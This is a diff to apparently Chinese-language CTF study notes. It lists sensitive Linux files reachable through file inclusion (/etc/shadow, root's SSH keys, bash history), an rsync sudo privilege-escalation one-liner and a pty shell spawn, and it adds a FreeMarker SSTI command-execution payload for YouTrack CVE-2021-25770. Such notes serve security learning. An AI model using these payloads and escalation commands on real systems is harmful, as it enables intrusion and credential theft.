@@ -333,7 +333,7 @@ print("index of subprocess.Popen:" + str(index))
 /etc/passwd
 /etc/shadow
 /etc/hosts
-/root/.bash_history //root的bash历史记录
+/root/.bash_history //root的bash历史记录，每个用户的家目录下都有这么一个文件
 /root/.ssh/authorized_keys
 /root/.mysql_history //mysql的bash历史记录
 /root/.wget-hsts
@@ -1959,3 +1959,12 @@ flaskdev addition。此位为开发者设置，无固定要求
 - php 日志文件（log）包含导致LFI->RCE。
 - 利用/usr/bin/rsync提权。https://gtfobins.github.io/gtfobins/rsync/ 。首先使用`sudo -l`查看`/usr/bin/rsync`是否具有suid。若有，则可利用该命令将当前用户提权到suid的用户。`sudo -u <suid-user> /usr/bin/rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null`
 - 利用python命令生成交互shell.`python3 -c 'import pty; pty.spawn("/bin/bash")'`
+219. [admin:admin](https://v0lk3n.github.io/writeup/HeroCTFv5/HeroCTFv5-SystemCollection#lfm3)
+- YouTrack SSTI漏洞：[CVE-2021-25770](https://www.synacktiv.com/en/publications/exploiting-cve-2021-25770-a-server-side-template-injection-in-youtrack.html).payload:
+```
+<#assign classloader=article.class.protectionDomain.classLoader>
+<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
+<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
+<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
+${dwf.newInstance(ec,null)("cmd")}
+```
